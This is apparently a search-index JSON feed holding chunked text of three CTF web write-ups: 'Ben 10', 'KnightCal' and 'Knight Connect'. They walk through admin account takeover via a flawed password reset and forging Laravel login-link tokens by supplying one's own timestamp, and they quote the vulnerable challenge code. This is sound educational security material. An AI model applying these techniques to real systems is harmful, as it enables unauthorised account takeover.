{
  "requests": [
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'Ben 10' from SrdnlenCTF - 2025",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83c\udf10 Ben 10 Challenge Presentation ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:0:0",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udcca Challenge Overview Category Details Additional Info \ud83c\udfc6 Event SrdlenCTF - 2025 Event Link \ud83d\udd30 Category Web \ud83c\udf10 \ud83d\udc8e Points 50 Out of 500 total \u2b50 Difficulty \ud83d\udfe2 Easy Personal Rating: 3/10 \ud83d\udc64 Author gheddus Profile \ud83c\udfae Solves 354 XX% solve rate \ud83d\udcc5 Date 19-01-2025 SrdlenCTF - 2025 Day X \ud83e\uddbe Solved By mH4ck3r0n3 Team: Team Aetruria ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:1:0",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udcdd Challenge Information Ben Tennyson\u2019s Omnitrix holds a mysterious and powerful form called Materia Grigia \u2014 a creature that only those with the sharpest minds can access. It\u2019s hidden deep within the system, waiting for someone clever enough to unlock it. Only the smartest can access what\u2019s truly hidden. Can you outsmart the system and reveal the flag? Website: http://ben10.challs.srdnlen.it:8080 ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:2:0",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83c\udfaf Challenge Files & Infrastructure ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:3:0",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Provided Files Files: \u00a0Attached Files ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:3:1",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udd0d Initial Analysis ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:4:0",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "First Steps Initially, the website appears as follows: Site Presentation Creating an account and logging into the site, it appears as follows: Home Page Trying to access the last image of the site, I receive the following error message: Ben 10 Consequently, I believe privileged access to the page is required. By examining the attached files, I noticed that every time a user was registered, another account was created in the database with admin privileges. The username of this account was formatted as \u201cadmin^username^token\u201d. This can be observed in the following function in the app.py file: @app.route('/register', methods=['GET', 'POST']) def register(): \"\"\"Handle user registration.\"\"\" if request.method == 'POST': username = request.form['username'] password = request.form['password'] if username.startswith('admin') or '^' in username: flash(\"I don't like admins\", \"error\") return render_template('register.html') if not username or not password: flash(\"Both fields are required.\", \"error\") return render_template('register.html') admin_username = f\"admin^{username}^{secrets.token_hex(5)}\" admin_password = secrets.token_hex(8) try: conn = sqlite3.connect(DATABASE) cursor = conn.cursor() cursor.execute(\"INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)\", (username, password, admin_username)) cursor.execute(\"INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)\", (admin_username, admin_password, None)) conn.commit() except sqlite3.IntegrityError: flash(\"Username already exists!\", \"error\") return render_template('register.html') finally: conn.close() flash(\"Registration successful!\", \"success\") return redirect(url_for('login')) return render_template('register.html') Now, all we need is to find the user and exploit the password reset function for the admin user to gain access and extract the flag. I noticed that the admin username is exposed on the homepage after logging in, inside an HTML tag with CSS display:none, making it visible through the page source using ChromeDevTools: <div style=\"display:none;\" id=\"admin_data\">{{ admin_username }}</div> In fact, by viewing the page source, we can retrieve the admin username: Admin Username now we can proceed to the exploit. ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:4:1",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83c\udfaf Solution Path ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:5:0",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Exploitation Steps Initial setup The initial phase involves registering a user account. Afterward, we need to log in and retrieve the username of the admin account that was created alongside the user account. This admin username is displayed on the homepage, as mentioned earlier. Once we have obtained the username, we can move on to the actual exploit. Exploitation The exploit involves resetting the password of the admin account to gain access. However, on the reset screen, we can only reset the password of the user account because a check is implemented in the reset function to block any user whose username starts with admin. Therefore, we begin the reset process with the normal user account created earlier to generate a valid reset token: Reset Token Once the token is generated, we gain access to the reset page. Here, no checks are applied on the type of account we want to reset; we only need to know the account name we obtained in the initial phase. Therefore, we proceed to reset the password of the admin account associated with our user account: Admin Password Reset Once the reset is completed, we simply need to log in with the admin account whose password we just reset, and visit the route /ben/10, which is the last photo in the list, to obtain the flag. Flag capture Manual Flag ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:5:1",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udee0\ufe0f Exploitation Process ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:6:0",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Approach The exploit uses requests and BeautifulSoup for extracting the user, the token, and the flag. It literally performs the step-by-step actions described previously: first, it creates an account using the Faker library to generate fake credentials. Then, it logs in and extracts the admin username associated with the user created earlier. After that, it resets the password for the admin user. Finally, after logging in again and visiting the /ben/10 route, it extracts the flag using BeautifulSoup (bs4) and prints it. \u00a0Exploit ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:6:1",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udea9 Flag Capture Flag ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:7:0",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Proof of Execution Automated Flag Screenshot of successful exploitation ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:7:1",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udd27 Tools Used ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:8:0",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "Primary Tools Tool Purpose Python Exploit ChromeDevTools Web Testing ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:8:1",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udca1 Key Learnings Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:9:0",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"
        ],
        "content": "\ud83d\udcca Final Statistics Metric Value Notes Time to Solve 00:10 From start to flag Global Ranking 20/1566 Challenge ranking Points Earned 500 Team contribution Created: 19-01-2025 \u2022 Last Modified: 19-01-2025 Author: mH4ck3r0n3 \u2022 Team: Team Aetruria ",
        "date": "05/02/2025",
        "objectID": "/posts/2025/02/05/ben-10/:10:0",
        "tags": [
          "Broken Access Control",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Ben 10",
        "uri": "/posts/2025/02/05/ben-10/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'KnightCal' from KnightCTF - 2025",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83c\udf10 KnightCal Challenge Presentation ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:0:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udcca Challenge Overview Category Details Additional Info \ud83c\udfc6 Event KnightCTF - 2025 Event Link \ud83d\udd30 Category Web \ud83c\udf10 \ud83d\udc8e Points 150 Out of XXXX total \u2b50 Difficulty \ud83d\udfe2 Easy Personal Rating: 1/10 \ud83d\udc64 Author NomanProdhan Profile \ud83c\udfae Solves 269 XX% solve rate \ud83d\udcc5 Date 20-01-2025 KnightCTF - 2025 Day X \ud83e\uddbe Solved By mH4ck3r0n3 Team: QnQSec ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:1:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udcdd Challenge Information In the realm of ancient codes, only those who enumerate correctly can unveil the hidden flag. Craft your mathematical expressions wisely and uncover the secrets that lie within. Flag Format: KCTF{FLaG_HeRe} ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:2:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83c\udfaf Challenge Files & Infrastructure ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:3:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Provided Files Files: None ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:3:1",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udd0d Initial Analysis ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:4:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "First Steps Initially, the website appears as follows: Site Presentation by trying to enter something in the numeric input box and submitting, I get letters in the file name: Submit Try so, I assume it\u2019s about finding the correct combination to print the contents of the file flag.txt. ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:4:1",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83c\udfaf Solution Path ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:5:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Exploitation Steps Initial setup After understanding how it works, I moved on to the exploit, doing a bit of guessing on the letters to figure out which number corresponded to which letter. Exploitation After a couple of attempts, I came up with this: Second Attempt continuing to experiment, I found the correct combination, 7195, which allowed me to read the flag.txt file. Flag capture Manual Flag ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:5:1",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udee0\ufe0f Exploitation Process ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:6:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Approach The exploit is very simple: it\u2019s a POST request to the page where I pass the parameter expression=7195, which is the correct combination. Then, I extract the flag from the response text using bs4: \u00a0Exploit ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:6:1",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udea9 Flag Capture Flag ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:7:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Proof of Execution Automated Flag Screenshot of successful exploitation ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:7:1",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udd27 Tools Used ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:8:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Primary Tools Tool Purpose Python Exploit ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:8:1",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udca1 Key Learnings ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:9:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:9:1",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udcca Final Statistics Metric Value Notes Time to Solve 00:04 From start to flag Global Ranking 9/445 Challenge ranking Points Earned 150 Team contribution Created: 20-01-2025 \u2022 Last Modified: 20-01-2025 Author: mH4ck3r0n3 \u2022 Team: QnQSec ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knightcal/:10:0",
        "tags": [
          "\ud83c\udf10 Web Security"
        ],
        "title": "KnightCal",
        "uri": "/posts/2025/02/04/knightcal/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "A detailed write-up of the Web challenge 'Knight Connect' from KnightCTF - 2025",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83c\udf10 Knight Connect Challenge Presentation ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:0:0",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udcca Challenge Overview Category Details Additional Info \ud83c\udfc6 Event KnightCTF - 2025 Event Link \ud83d\udd30 Category Web \ud83c\udf10 \ud83d\udc8e Points 260 Out of 500 total \u2b50 Difficulty \ud83d\udfe2 Easy Personal Rating: 3/10 \ud83d\udc64 Author NomanProdhan Profile \ud83c\udfae Solves 49 XX% solve rate \ud83d\udcc5 Date 20-01-2025 KnightCTF - 2025 Day X \ud83e\uddbe Solved By Bebo07 Team: QnQSec ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:1:0",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udcdd Challenge Information In a realm where ancient knights and modern technology collide, a mysterious portal emerges\u2014known as \u201cKnight Connect.\u201d Only the wisest and most cunning warriors can decipher its secrets. Legends whisper of a forgotten system, guarded by layers of encryption and vulnerabilities, waiting for a brave soul to breach its defenses. Do you possess the skills to uncover the truth? Enter the domain of Knight Connect and etch your name into the annals of digital knighthood. The challenge awaits. ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:2:0",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83c\udfaf Challenge Files & Infrastructure ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:3:0",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Provided Files Files: \u00a0Attached Files ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:3:1",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udd0d Initial Analysis ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:4:0",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "First Steps The site initially appeared as follows: Site Presentation with a login screen. After completing the registration and login, I was redirected to the following page: Home Page I couldn\u2019t find anything else on the site, so I started reading the attached files. At first, I was overwhelmed and didn\u2019t know where to look due to the number of files present. The first thing that came to mind was to forge some session cookies since the APP_KEY of Laravel was in the .env file. Also, because it required the session to be set to is_admin in order to display the flag. We can see this from the following lines of code in the index.blade.php file under the resources/views/users folder: @if (isset($flag) && session()->has('is_admin') && session('is_admin')) <div class=\"flag\">Flag: {{ $flag->flag }}</div> @endif but then I discovered that it wasn\u2019t the right path. However, I realized that I needed to get an administrator account to be able to read the flag. In the web.php file under the resources/routes folder, I found all the routes of the site, including one that seemed a bit suspicious: /contact. Visiting it redirected me to the following page: Contact where the administrator accounts and their respective emails were displayed. Spoiler: only one of these was valid, which was nomanprodhan@knightconnect.com (the username of the challenge creator). I then continued looking at other files, but I was interested in how authentication was being handled, so I searched for the authentication file, which was named AuthController.php under the Http/Controllers folder. Here I found the vulnerability\u2014there were two functions that allowed you to request a login link for an account, which created a token formed by combining the email and a timestamp at that moment, all encrypted using the bcrypt function. The other function allowed you to log in using that generated link by passing the token as a parameter: public function requestLoginUrl(Request $request) { $request->validate([ 'email' => 'required|email', ]); $user = User::where('email', $request->email)->first(); if (!$user) { return back()->withErrors(['email' => 'Email not found']); } $time = time(); $data = $user->email . '|' . $time; $token = bcrypt($data); $loginUrl = url('/login-link?token=' . urlencode($token) . '&time=' . $time . '&email=' . urlencode($user->email)); return back()->with('success', 'Login link generated, but email sending is disabled.'); } public function loginUsingLink(Request $request) { $token = $request->query('token'); $time = $request->query('time'); $email = $request->query('email'); if (!$token || !$time || !$email) { return response('Invalid token or missing parameters', 400); } if (time() - $time > 3600) { return response('Token expired', 401); } $data = $email . '|' . $time; if (!Hash::check($data, $token)) { return response('Token validation failed', 401); } $user = User::where('email', $email)->first(); if (!$user) { return response('User not found', 404); } session(['user_id' => $user->id]); session(['is_admin' => $user->is_admin]); return redirect()->route('users'); } the first function doesn\u2019t really have any vulnerabilities, since it only shows how the token is created to request the \u201cinstant\u201d login URL. In contrast, the second function has a significant vulnerability, as the only check it does is ensure the timestamp of the generated token is at most one hour old (3600 seconds), otherwise, it becomes invalid. However, we can manipulate the timestamp ourselves by passing a fake value as a parameter. In fact, to make it secure, the generated token with the timestamp should have been saved in the database, and if it wasn\u2019t the exact timestamp, it wouldn\u2019t allow access (although a brute-force attack could be used to try all possible timestamps). So, I realized that it\u2019s possible to forge a token\u2014one just needs to know the email of the account they want to access, and as we saw earlier in the /contact route, there were quite a few admin emails\u2026 Now that we\u2019ve figured it all out, let\u2019s proceed with the exploit. ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:4:1",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83d\udd2c Vulnerability Analysis ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:5:0",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "Potential Vulnerabilities Insecure Authentication ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:5:1",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
        "content": "\ud83c\udfaf Solution Path ",
        "date": "04/02/2025",
        "objectID": "/posts/2025/02/04/knight-connect/:6:0",
        "tags": [
          "Insecure Authentication",
          "Laravel",
          "\ud83c\udf10 Web Security"
        ],
        "title": "Knight Connect",
        "uri": "/posts/2025/02/04/knight-connect/"
      }
    },
    {
      "action": "updateObject",
      "body": {
        "categories": [
          "Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"
        ],
